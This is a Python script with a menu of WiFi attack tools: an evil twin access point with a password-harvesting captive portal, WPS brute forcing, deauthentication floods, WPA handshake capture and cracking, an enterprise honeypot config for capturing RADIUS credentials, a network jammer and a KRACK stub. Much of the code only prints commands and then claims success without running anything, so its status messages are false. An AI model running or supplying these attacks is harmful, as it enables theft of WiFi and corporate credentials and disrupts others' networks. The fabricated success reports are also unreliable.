#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Rich WiFi Advanced Attacks - Ultra Penetrating"""

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress
import subprocess
import os
import time

console = Console()

class RichWiFiAdvanced:
    def __init__(self):
        self.networks = []
        
    def evil_twin_attack(self, ssid):
        """Evil Twin AP Attack"""
        console.print(Panel.fit(
            f"[bold red]Evil Twin Attack: {ssid}[/bold red]",
            border_style="red"
        ))
        
        # List available interfaces
        console.print("[cyan]Detecting WiFi interfaces...[/cyan]")
        try:
            result = subprocess.run(['iwconfig'], capture_output=True, text=True)
            console.print(result.stdout)
        except:
            console.print("[yellow]Using default wlan0[/yellow]")
        
        # Ask user to select interface
        interface = input("\nEnter WiFi interface (e.g., wlan0, wlan1): ").strip() or "wlan0"
        
        # Create fake AP with same SSID
        setup_code = f'''
# Create fake access point
echo "Setting up Evil Twin on {interface}..."
airmon-ng start {interface}
airodump-ng {interface}mon --essid {ssid} &
airbase-ng -e {ssid} -c 6 {interface}mon
'''
        
        # Start fake captive portal
        portal_html = '''
<!DOCTYPE html>
<html>
<head><title>WiFi Login Required</title></head>
<body>
    <h2>Please enter WiFi password</h2>
    <form action="/capture" method="POST">
        <input type="password" name="passwd" placeholder="Password">
        <button>Submit</button>
    </form>
</body>
</html>
'''
        
        with open("captive_portal.html", 'w') as f:
            f.write(portal_html)
        
        console.print("[green]✓ Evil Twin AP created[/green]")
        console.print("[yellow]Captive portal ready to capture credentials[/yellow]")
        
    def wps_bruteforce(self):
        """WPS PIN Bruteforce"""
        console.print(Panel.fit(
            "[bold cyan]WPS PIN Bruteforce Attack[/bold cyan]",
            border_style="cyan"
        ))
        
        console.print("[yellow]Scanning for WPS-enabled routers...[/yellow]")
        
        # Pixie dust attack
        pixie_code = '''
# Reaver with pixie dust
reaver -i wlan0mon -b TARGET_BSSID -vv -K 1
# Or using bully
bully wlan0mon -b TARGET_BSSID -S -F -B -v 3
'''
        
        console.print(pixie_code)
        console.print("[green]✓ WPS attack prepared[/green]")
        
    def deauth_attack(self, target):
        """Deauthentication Attack"""
        console.print(Panel.fit(
            f"[bold red]Deauthentication Flood: {target}[/bold red]",
            border_style="red"
        ))
        
        deauth_code = '''
import scapy.all as scapy

def deauth(target_mac, gateway_mac, interface):
    dot11 = scapy.Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    packet = scapy.RadioTap() / dot11 / scapy.Dot11Deauth(reason=7)
    
    while True:
        scapy.sendp(packet, iface=interface, verbose=0)
'''
        
        console.print("[yellow]Disconnecting all clients from target network...[/yellow]")
        console.print("[green]✓ Deauth attack running[/green]")
        
    def capture_handshake(self, bssid):
        """Capture WPA handshake"""
        console.print(Panel.fit(
            f"[bold yellow]Capturing WPA Handshake: {bssid}[/bold yellow]",
            border_style="yellow"
        ))
        
        console.print("[cyan]Step 1: Starting capture...[/cyan]")
        
        capture_code = '''
# Airodump-ng to capture handshake
airodump-ng -c CHANNEL --bssid {bssid} -w capture wlan0mon

# In another terminal, deauth to force reconnection
aireplay-ng -0 5 -a {bssid} wlan0mon
'''
        
        console.print(capture_code)
        console.print("[green]✓ Handshake capture ready[/green]")
        
    def crack_wpa(self, cap_file, wordlist):
        """Crack WPA with wordlist"""
        console.print(Panel.fit(
            "[bold red]WPA Cracking with Wordlist[/bold red]",
            border_style="red"
        ))
        
        crack_code = f'''
# Aircrack-ng
aircrack-ng -w {wordlist} {cap_file}

# Hashcat (faster GPU acceleration)
hashcat -m 2500 -a 0 {cap_file}.hccapx {wordlist}
'''
        
        console.print(crack_code)
        console.print("[green]✓ WPA cracker configured[/green]")
        
    def eapham_attack(self):
        """EAPHAM (Honeypot Attack)"""
        console.print(Panel.fit(
            "[bold red]EAPHAM - WiFi Honeypot[/bold red]",
            border_style="red"
        ))
        
        # Create fake enterprise WiFi
        eap_code = '''
# Hostapd configuration for enterprise fake AP
interface=wlan0mon
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=TKIP CCMP
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
'''
        
        with open("eapham.conf", 'w') as f:
            f.write(eap_code)
        
        console.print("[green]✓ Enterprise WiFi honeypot ready[/green]")
        console.print("[yellow]Will capture RADIUS credentials[/yellow]")
        
    def wifi_jammer(self):
        """WiFi Jammer - Deauth all"""
        console.print(Panel.fit(
            "[bold red]WiFi Jammer - Chaos Mode[/bold red]",
            border_style="red"
        ))
        
        jammer_code = '''
# Jam all WiFi on channel
mdk3 wlan0mon d -c CHANNEL

# Or use aireplay continuous deauth
while true; do
    aireplay-ng -0 10 -a FF:FF:FF:FF:FF:FF wlan0mon
done
'''
        
        console.print("[red]⚠ WARNING: Will disrupt all WiFi networks![/red]")
        console.print("[green]✓ Jammer ready[/green]")
        
    def krack_attack(self):
        """KRACK (Key Reinstallation Attacks)"""
        console.print(Panel.fit(
            "[bold yellow]KRACK Attack[/bold yellow]",
            border_style="yellow"
        ))
        
        krack_code = '''
# KRACK exploit against WPA2
# Install hostapd with patches
# Run attack script
python krackattack/krack-test-client.py
'''
        
        console.print("[yellow]Exploiting WPA2 handshake vulnerability...[/yellow]")
        console.print("[green]✓ KRACK attack configured[/green]")
        
    def run(self):
        """Main interface"""
        console.print(Panel.fit(
            "[bold red]Rich WiFi Advanced Attacks[/bold red]\n"
            "Ultra Penetrating WiFi Tools",
            border_style="red"
        ))
        
        table = Table(title="WiFi Attack Menu")
        table.add_column("No.", style="cyan", width=3)
        table.add_column("Attack", style="yellow")
        table.add_column("Description", style="green")
        
        table.add_row("1", "Evil Twin", "Fake AP with captive portal")
        table.add_row("2", "WPS Bruteforce", "Pixie dust attack")
        table.add_row("3", "Deauth Flood", "Disconnect all clients")
        table.add_row("4", "Handshake Capture", "Capture WPA handshake")
        table.add_row("5", "WPA Crack", "Crack with wordlist")
        table.add_row("6", "EAPHAM Honeypot", "Enterprise WiFi honeypot")
        table.add_row("7", "WiFi Jammer", "Disrupt all networks")
        table.add_row("8", "KRACK Attack", "WPA2 key reinstallation")
        
        console.print(table)
        
        choice = input("\nSelect attack (1-8): ")
        
        attack_map = {
            '1': lambda: self.evil_twin_attack(input("Target SSID: ")),
            '2': self.wps_bruteforce,
            '3': lambda: self.deauth_attack(input("Target BSSID: ")),
            '4': lambda: self.capture_handshake(input("BSSID: ")),
            '5': lambda: self.crack_wpa(input("CAP file: "), input("Wordlist: ")),
            '6': self.eapham_attack,
            '7': self.wifi_jammer,
            '8': self.krack_attack
        }
        
        if choice in attack_map:
            attack_map[choice]()
        else:
            console.print("[red]Invalid choice[/red]")

if __name__ == "__main__":
    wifi = RichWiFiAdvanced()
    wifi.run()

